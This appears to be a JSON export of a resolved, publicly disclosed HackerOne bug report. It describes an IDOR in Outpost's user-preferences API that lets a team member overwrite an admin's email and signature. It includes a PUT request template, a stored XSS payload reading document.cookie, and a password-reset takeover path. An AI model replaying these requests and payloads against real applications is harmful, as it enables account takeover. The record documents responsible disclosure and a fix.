@@ -1,0 +1,361 @@
+{
+    "id": 854290,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTQyOTA=",
+    "url": "https://hackerone.com/reports/854290",
+    "title": "IDOR on update user preferences",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "critical",
+    "readable_substate": "Resolved",
+    "created_at": "2020-04-20T14:37:10.118Z",
+    "submitted_at": "2020-04-20T14:37:10.118Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "macasun",
+        "url": "/macasun",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 42327,
+        "url": "https://hackerone.com/palo_alto_software",
+        "handle": "palo_alto_software",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/327/6b83191758494b9c630b6ba94f088d0c78829602_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Palo Alto Software",
+            "twitter_handle": "",
+            "website": "https://paloalto.com",
+            "about": ""
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-05-13T19:52:07.215Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-05-13T13:13:39.249Z",
+    "team_member_agreed_on_going_public_at": "2020-05-13T19:52:07.147Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\nTeam member with role USER can change data of any user in the team, or steal his cookies, or steal the account of victim via forget password function.\n\n## Steps To Reproduce:\n\n  1. Login in as user1 (the user with role `admin`) and invite user2 (set his role to `user`).\n  2. Login in as user2, open Mail tab and select user1 from `Conversation assignment` dropdown (see F796149 attachment).\n  3. Open network tools in the browser devTools or open local proxy and copy `UserUuid` (`da4f313f-e21e-4b5f-b2da-42d9864716f6` in my case) of the user1 from the following request: https://api.outpost.co/api/v1/conversation/assigned?assignedToUserUuid=da4f313f-e21e-4b5f-b2da-42d9864716f6.\n  4. Use template `request1` to create http request. Change `{user1-uuid}` to user1 Uuid, `{user2-cookie}` to user2 cookie. In the request body: `{attacker-email}` to email controlled by user2, `signature` to the following: `<p style=\\\"margin:0;\\\">User Signature2<img src=x onerror=alert(document.cookie) ></p>`. Send request.\n  5. Login in as user1. Open https://app.outpost.co/settings/preferences, alert with user1 cookie will appear (see F796148 attachment).\n  6. Open https://app.outpost.co/sign-in/help and paste `{attacker-email}`. Open email client, click the link to restore password, enter a new password. Now you can login in using user1 email address and password entered on the previos step.\n\n## Supporting Material/References:\n\n- request1 template:\n\n```\nPUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0\nHost: api.outpost.co\nContent-Length: 434\nSec-Fetch-Dest: empty\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36\nDnt: 1\nContent-Type: application/json\nAccept: */*\nOrigin: https://app.outpost.co\nSec-Fetch-Site: same-site\nSec-Fetch-Mode: cors\nReferer: https://app.outpost.co/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7\nCookie: auth={user2-cookie}\n\n{\n  \"firstName\": \"user1-changed-by-user2\",\n  \"lastName\": \"null\",\n  \"email\": \"{attacker-email}\",\n  \"role\": \"USER\",\n  \"defaultMailboxUuid\": \"\",\n  \"mailboxUuids\": [\n    \"e4a63ae3-bb10-46f8-be28-a2660a2344ec\"\n  ],\n  \"signature\": \"{signature}\",\n  \"timezone\": \"Europe/Moscow\",\n  \"defaultSendAndResolve\": false,\n  \"selectFirstConversation\": true\n}\n```\n\n## Impact\n\nAn attacker can change data of any user in the team, or steal his cookies, or steal account of victim via forget password function.",
+    "weakness": {
+        "id": 55,
+        "name": "Insecure Direct Object Reference (IDOR)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 796148,
+            "file_name": "s2.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Y3B2MPEgJGngTmZzjwkacAiU?response-content-disposition=attachment%3B%20filename%3D%22s2.jpg%22%3B%20filename%2A%3DUTF-8%27%27s2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e553a8f0721a1a52f9898a8de9571c6fd294de65c92135ad7294c9c1084be8aa",
+            "file_size": 313887,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 796149,
+            "file_name": "s1.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TGpp6b4w7tYTrJjYfZADNLWJ?response-content-disposition=attachment%3B%20filename%3D%22s1.jpg%22%3B%20filename%2A%3DUTF-8%27%27s1.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072323Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3189804e5d4b5000e5781d38b94f977f54ca018dcfc84a351f744bf58b939ede",
+            "file_size": 412260,
+            "type": "image/jpeg"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-06-12T13:13:39.310Z",
+    "allow_singular_disclosure_after": -101326184.3272303,
+    "singular_disclosure_allowed": true,
+    "vote_count": 9,
+    "voters": [
+        "brahim_boufakri01",
+        "ali",
+        "mik317",
+        "sachin_kr",
+        "rashedul_css",
+        "klau5",
+        "r4sk0ln1k0v",
+        "themagicnacho",
+        "ravana_26"
+    ],
+    "severity": {
+        "rating": "critical",
+        "score": 10.0,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "low",
+            "user_interaction": "none",
+            "scope": "changed",
+            "confidentiality": "low",
+            "integrity": "high",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 35341,
+        "asset_type": "URL",
+        "asset_identifier": "app.outpost.co",
+        "max_severity": "none"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 7729652,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@alexandermac05, thanks for the report! Can you clarify steps 5 and 6?\n\nIn step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nIn step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nThanks again for hacking on our systems.",
+            "automated_response": false,
+            "created_at": "2020-04-20T19:40:40.009Z",
+            "updated_at": "2020-04-20T19:40:40.009Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7729917,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@kad3nce thanks for the response.\n\n> In step 5, were you able to harvest user1's cookie and make authenticated requests with it?\n\nNo, this is impossible. Your app stores `auth` cookie on the different domain - `.appcues.com`, so this is impossible to get them using provided XSS, but I guess this possible with another technique, maybe injected iFrame. \n\n> In step 6, are you saying that if you are already logged in as user1, and enter user2's email in the forgot password form, that user2 will get an email to reset user1's password?\n\nSorry, for inaccurate explanation, in steps 4 and 6 you should use email address that is controlled by user2, but that is **not** email used for registration on outpost.co. For example, if he used user2@mail.com for registration, on steps 4 and 6 he can use user2222@mail.com.\n\nBest regards,\nAlex.",
+            "automated_response": false,
+            "created_at": "2020-04-20T20:05:20.300Z",
+            "updated_at": "2020-04-20T20:05:20.300Z",
+            "actor": {
+                "username": "macasun",
+                "cleared": false,
+                "verified": false,
+                "url": "/macasun",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7731863,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thanks for the follow-up, @alexandermac05. This is the first report of the privilege escalation issue in the API. We do have another report of the XSS vulnerability in the signature editor. We'll get a fix in the queue for the priv escalation and will report back once it's resolved.\n\nThanks again!",
+            "automated_response": false,
+            "created_at": "2020-04-20T23:58:29.281Z",
+            "updated_at": "2020-04-20T23:58:29.281Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7733818,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@kad3nce ok, thanks for the update.",
+            "automated_response": false,
+            "created_at": "2020-04-21T07:11:57.708Z",
+            "updated_at": "2020-04-21T07:11:57.708Z",
+            "actor": {
+                "username": "macasun",
+                "cleared": false,
+                "verified": false,
+                "url": "/macasun",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7968168,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "@macasun, the fix for this has been deployed. Have a good one!",
+            "automated_response": false,
+            "created_at": "2020-05-11T22:07:14.550Z",
+            "updated_at": "2020-05-11T22:07:14.550Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "macasun",
+                "url": "/macasun"
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7989044,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@kad3nce thanks for the good feedback. I confirm that issue is fixed, do you agree to disclosure the report?",
+            "automated_response": false,
+            "created_at": "2020-05-13T13:13:33.036Z",
+            "updated_at": "2020-05-13T13:13:33.036Z",
+            "actor": {
+                "username": "macasun",
+                "cleared": false,
+                "verified": false,
+                "url": "/macasun",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7989047,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-05-13T13:13:39.280Z",
+            "updated_at": "2020-05-13T13:13:39.280Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "macasun",
+                "cleared": false,
+                "verified": false,
+                "url": "/macasun",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iCmYFpL1XoWHiQKcBiZ21XZ2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7993210,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-05-13T19:52:07.168Z",
+            "updated_at": "2020-05-13T19:52:07.168Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        },
+        {
+            "id": 7993211,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-05-13T19:52:07.238Z",
+            "updated_at": "2020-05-13T19:52:07.238Z",
+            "actor": {
+                "username": "kad3nce",
+                "cleared": false,
+                "verified": false,
+                "url": "/kad3nce",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/5RN5iBVGU8ezD8a1xWbHqN2k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "palo_alto_software"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
